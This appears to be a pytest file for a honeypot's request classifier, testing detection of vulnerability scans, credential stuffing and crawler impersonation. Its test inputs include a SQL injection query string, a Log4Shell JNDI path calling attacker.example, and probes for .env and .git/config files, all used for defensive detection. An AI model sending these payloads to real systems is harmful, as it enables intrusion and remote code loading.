"""Classifier tests. Each one is a traffic pattern I've seen in WAF logs."""

from __future__ import annotations

import pytest

from honeypot.app.classifier import Verdict, VelocityContext, classify
from honeypot.app.fingerprint import build_fingerprint

CHROME_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

BROWSER_HEADERS = {
    "host": "portal.example",
    "user-agent": CHROME_UA,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "pt-BR,pt;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
    "sec-fetch-user": "?1",
    "sec-ch-ua": '"Chromium";v="126"',
    "referer": "https://portal.example/",
    "connection": "keep-alive",
}

BROWSER_ORDER = list(BROWSER_HEADERS.keys())


def fp(headers, order=None, rdns=None):
    return build_fingerprint(headers, order or list(headers.keys()), rdns)


def test_real_browser_is_not_flagged_as_automation():
    result = classify(
        method="GET",
        path="/",
        query="",
        fingerprint=fp(BROWSER_HEADERS, BROWSER_ORDER),
        velocity=VelocityContext(requests=2, distinct_paths=2),
    )
    assert result.verdict == Verdict.LIKELY_HUMAN


def test_env_file_probe_is_a_vulnerability_scan():
    headers = {"host": "portal.example", "user-agent": "curl/8.4.0", "accept": "*/*"}
    result = classify(
        method="GET",
        path="/.env",
        query="",
        fingerprint=fp(headers),
        velocity=VelocityContext(requests=3, distinct_paths=3, not_found_ratio=1.0),
        status_code=404,
    )
    assert result.verdict == Verdict.VULN_SCANNER
    assert any(s.name == "sensitive_artifact_request" for s in result.signals)


def test_sql_injection_probe_in_query_string():
    headers = {"host": "portal.example", "user-agent": "sqlmap/1.8"}
    result = classify(
        method="GET",
        path="/api/v1/products",
        query="id=1' UNION SELECT null,version()--",
        fingerprint=fp(headers),
        velocity=VelocityContext(requests=10, distinct_paths=2),
    )
    assert result.verdict == Verdict.VULN_SCANNER
    assert any(s.detail == "sqli-probe" for s in result.signals)


def test_log4shell_probe_is_detected_in_path():
    headers = {"host": "portal.example", "user-agent": "Mozilla/5.0"}
    result = classify(
        method="GET",
        path="/${jndi:ldap://attacker.example/a}",
        query="",
        fingerprint=fp(headers),
    )
    assert any(s.detail == "log4shell-probe" for s in result.signals)


def test_credential_stuffing_beats_generic_automation():
    headers = {
        "host": "portal.example",
        "user-agent": "python-requests/2.32.0",
        "content-type": "application/x-www-form-urlencoded",
    }
    result = classify(
        method="POST",
        path="/login",
        query="",
        fingerprint=fp(headers),
        velocity=VelocityContext(
            requests=40, distinct_paths=1, distinct_usernames=25, not_found_ratio=0.0
        ),
        status_code=401,
    )
    assert result.verdict == Verdict.CREDENTIAL_ATTACK
    assert result.confidence > 0.6


def test_verified_crawler_short_circuits_behavioural_signals():
    headers = {
        "host": "portal.example",
        "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "accept": "*/*",
    }
    # crawl pattern aggressive enough to score as enumeration on its own
    result = classify(
        method="GET",
        path="/api/v1/products",
        query="",
        fingerprint=fp(headers, rdns="crawl-66-249-66-1.googlebot.com"),
        velocity=VelocityContext(requests=500, distinct_paths=300),
    )
    assert result.verdict == Verdict.VERIFIED_CRAWLER
    assert result.confidence == pytest.approx(0.99)


def test_unverified_googlebot_is_treated_as_impersonation():
    headers = {
        "host": "portal.example",
        "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "accept": "*/*",
    }
    result = classify(
        method="GET",
        path="/api/v1/products",
        query="",
        fingerprint=fp(headers, rdns="ec2-13-59-1-1.compute.amazonaws.com"),
        velocity=VelocityContext(requests=200, distinct_paths=5),
    )
    assert result.verdict != Verdict.VERIFIED_CRAWLER
    assert any(s.name == "crawler_impersonation" for s in result.signals)


def test_path_enumeration_is_flagged_regardless_of_user_agent():
    # a spoofed browser UA shouldn't rescue an obvious directory sweep
    result = classify(
        method="GET",
        path="/backup",
        query="",
        fingerprint=fp(BROWSER_HEADERS, BROWSER_ORDER),
        velocity=VelocityContext(requests=120, distinct_paths=95, not_found_ratio=0.92),
        status_code=404,
    )
    assert result.verdict == Verdict.VULN_SCANNER


def test_confidence_reflects_margin_not_just_magnitude():
    weak = classify(
        method="GET",
        path="/admin",
        query="",
        fingerprint=fp({"host": "h", "user-agent": CHROME_UA, "accept": "*/*"}),
    )
    strong = classify(
        method="GET",
        path="/.env",
        query="",
        fingerprint=fp({"host": "h", "user-agent": "nikto/2.5"}),
        velocity=VelocityContext(requests=80, distinct_paths=70, not_found_ratio=0.95),
        status_code=404,
    )
    assert strong.confidence > weak.confidence


def test_every_verdict_carries_its_evidence():
    result = classify(
        method="GET",
        path="/.git/config",
        query="",
        fingerprint=fp({"host": "h", "user-agent": "gobuster/3.6"}),
        status_code=404,
    )
    assert result.signals, "verdict with no signals can't be defended to a customer"
    assert all(s.weight > 0 for s in result.signals)
    assert result.to_dict()["signals"][0]["name"]
